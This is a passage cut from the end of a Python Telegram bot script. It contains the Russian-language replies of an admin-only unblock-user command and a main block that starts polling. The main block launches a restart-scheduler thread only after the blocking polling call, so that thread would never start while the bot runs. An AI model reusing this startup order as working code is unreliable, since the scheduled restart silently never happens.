                bot.send_message(message.chat.id, "Пользователь не найден в списке заблокированных.")
        except (IndexError, ValueError):
            bot.send_message(message.chat.id, "Ошибка: укажите корректный ID пользователя.")
    else:
        bot.send_message(message.chat.id, "У вас нет прав для выполнения этой команды.")

if __name__ == "__main__":
    print("Бот запущен.")
    bot.polling()
    restart_thread = threading.Thread(target=restart_scheduler, daemon=True)
    restart_thread.start()

